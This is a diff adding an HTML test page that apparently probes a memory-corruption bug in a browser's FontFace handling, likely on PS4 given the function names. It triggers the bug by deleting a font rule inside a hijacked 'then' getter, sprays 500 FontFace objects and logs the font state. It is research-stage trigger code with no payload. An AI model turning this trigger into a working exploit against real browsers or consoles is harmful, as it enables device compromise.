@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — FontFace state probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 80vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+.note { color: #aaa; font-size: 12px; margin-bottom: 8px; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">probing FontFace state...</div>
+<p class="note">Follow-up to corruption probe. ONE load, quit browser between runs.</p>
+<div id="log"></div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+function dumpFonts(label) {
+    ps4log('--- ' + label + ' ---');
+    ps4log('document.fonts.size = ' + document.fonts.size);
+    ps4log('document.fonts.status = ' + document.fonts.status);
+    var i = 0;
+    document.fonts.forEach(function (f) {
+        ps4log('  font[' + i + '] family=' + f.family + ' status=' + f.status);
+        i++;
+    });
+    if (i === 0) ps4log('  (empty)');
+}
+
+function sprayFontFaces(n) {
+    var faces = [];
+    for (var i = 0; i < n; i++) {
+        faces.push(new FontFace('spray' + i, 'local(Helvetica)', { unicodeRange: 'U+0041' }));
+    }
+    return faces;
+}
+
+window.onload = function () {
+    ps4log('Phase 3b — FontFace state probe');
+    ps4log('UA: ' + navigator.userAgent);
+
+    dumpFonts('before trigger');
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    // spray same-class objects (not ArrayBuffers)
+    var faceSpray = sprayFontFaces(500);
+    ps4log('sprayed 500 FontFace objects (not added to document.fonts)');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER FIRED');
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+                dumpFonts('inside trigger callback');
+            }
+            return undefined;
+        }
+    });
+
+    // capture loaded promise BEFORE load call
+    var loadedP = A.loaded;
+    ps4log('A.status before load = ' + A.status);
+
+    document.fonts.load('1em x', 'AB');
+    ps4log('document.fonts.load called');
+
+    dumpFonts('immediately after load call');
+
+    loadedP.then(function (resolved) {
+        ps4log('A.loaded RESOLVED after trigger');
+        ps4log('  resolved === A ? ' + (resolved === A));
+        ps4log('  resolved.status = ' + resolved.status);
+        ps4log('  resolved.family = ' + resolved.family);
+        try {
+            ps4log('  reload load() = ' + typeof resolved.load);
+        } catch (e) {
+            ps4log('  resolved.load threw: ' + e);
+        }
+        dumpFonts('after A.loaded resolved');
+    }).catch(function (e) {
+        ps4log('A.loaded REJECTED: ' + e);
+    });
+
+    document.fonts.ready.then(function () {
+        ps4log('document.fonts.ready resolved, status=' + document.fonts.status);
+        dumpFonts('after document.fonts.ready');
+    });
+
+    document.fonts.load('1em x', 'AB').then(function (faces) {
+        ps4log('second document.fonts.load resolved, count=' + faces.length);
+        for (var j = 0; j < faces.length; j++) {
+            ps4log('  returned[' + j + '] family=' + faces[j].family + ' status=' + faces[j].status);
+        }
+    }).catch(function (e) {
+        ps4log('second document.fonts.load rejected: ' + e);
+    });
+
+    setTimeout(function () {
+        dumpFonts('final snapshot 2s');
+        ps4status('done — read log', '#0f0');
+    }, 2000);
+};
+</script>
+</body>
+</html>
